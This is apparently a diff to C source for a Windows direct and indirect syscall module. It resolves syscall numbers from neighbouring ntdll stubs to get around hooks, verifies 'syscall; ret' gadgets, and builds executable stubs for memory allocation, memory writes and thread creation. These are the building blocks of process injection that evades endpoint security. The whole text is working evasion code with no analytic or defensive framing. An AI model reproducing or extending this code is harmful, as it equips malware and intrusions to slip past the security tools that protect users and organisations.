@@ -83,6 +83,18 @@ static BYTE * find_syscall_insn(BYTE * p, int maxn) {
 	return NULL;
 }
 
+/* an indirect gadget is only trusted when it decodes exactly as
+ * syscall; ret - anything else (different stub layout on newer builds,
+ * a false-positive 0F 05 inside an immediate) makes the entry indirect-
+ * unavailable and method 2 falls back to the direct stub */
+static BYTE * g3_gadget_ok(BYTE * g) {
+	if (g == NULL)
+		return NULL;
+	if (g[0] == 0x0F && g[1] == 0x05 && g[2] == 0xC3)
+		return g;
+	return NULL;
+}
+
 static BOOL parse_nt_stub(BYTE * fn, sc_entry * out) {
 	int i;
 	if (fn == NULL || out == NULL)
@@ -96,13 +108,13 @@ static BOOL parse_nt_stub(BYTE * fn, sc_entry * out) {
 			BYTE * down = fn - delta * 32;
 			if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
 				out->ssn = *(DWORD *)(up + 4) - (DWORD)delta;
-				out->gadget = find_syscall_insn(up, 24);
-				return out->gadget != NULL;
+				out->gadget = g3_gadget_ok(find_syscall_insn(up, 24));
+				return TRUE; /* direct stub still safe; indirect only if gadget verified */
 			}
 			if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
 				out->ssn = *(DWORD *)(down + 4) + (DWORD)delta;
-				out->gadget = find_syscall_insn(down, 24);
-				return out->gadget != NULL;
+				out->gadget = g3_gadget_ok(find_syscall_insn(down, 24));
+				return TRUE;
 			}
 		}
 		return FALSE;
@@ -110,8 +122,8 @@ static BOOL parse_nt_stub(BYTE * fn, sc_entry * out) {
 	for (i = 0; i < 24; i++) {
 		if (fn[i] == 0xB8) {
 			out->ssn = *(DWORD *)(fn + i + 1);
-			out->gadget = find_syscall_insn(fn, 32);
-			return out->gadget != NULL;
+			out->gadget = g3_gadget_ok(find_syscall_insn(fn, 32));
+			return TRUE;
 		}
 	}
 	(void)i;
@@ -183,7 +195,8 @@ static void * make_exec(sc_entry * e, int indirect) {
 	p = e->stub;
 
 	memset(built, 0, sizeof(built));
-	if (indirect && e->gadget && e->arity > 4) {
+	indirect = indirect && (e->gadget != NULL); /* unverified gadget: plain direct */
+	if (indirect && e->arity > 4) {
 		/* stack-argument syscalls: the v2 push would shift [rsp+8..]
 		 * under the kernel's nose - fall back to the v1 plain indirect
 		 * jump (hides everything except the immediate stub frame).
@@ -243,6 +256,21 @@ void syscalls_resolve(void) {
 
 int syscalls_ssn_ntwrite(void) {
 	return (sc_ready && sc_write.ready) ? (int)sc_write.ssn : 0;
+}
+
+void * syscalls_test_gadget(const char * name);
+
+void * syscalls_test_gadget(const char * name)
+{
+	if (name == NULL)
+		return NULL;
+	if (strcmp(name, "NtAllocateVirtualMemory") == 0)
+		return sc_alloc.gadget;
+	if (strcmp(name, "NtWriteVirtualMemory") == 0)
+		return sc_write.gadget;
+	if (strcmp(name, "NtFreeVirtualMemory") == 0)
+		return sc_free.gadget;
+	return NULL;
 }
 
 int syscalls_gate_ready_count(void) {
@@ -346,6 +374,21 @@ static NTSTATUS sc_call_threadex(PHANDLE out, ACCESS_MASK acc, void * oa, HANDLE
 #else
 void syscalls_resolve(void) {}
 int syscalls_ssn_ntwrite(void) { return 0; }
+void * syscalls_test_gadget(const char * name);
+
+void * syscalls_test_gadget(const char * name)
+{
+	if (name == NULL)
+		return NULL;
+	if (strcmp(name, "NtAllocateVirtualMemory") == 0)
+		return sc_alloc.gadget;
+	if (strcmp(name, "NtWriteVirtualMemory") == 0)
+		return sc_write.gadget;
+	if (strcmp(name, "NtFreeVirtualMemory") == 0)
+		return sc_free.gadget;
+	return NULL;
+}
+
 int syscalls_gate_ready_count(void) { return 0; }
 #endif
 
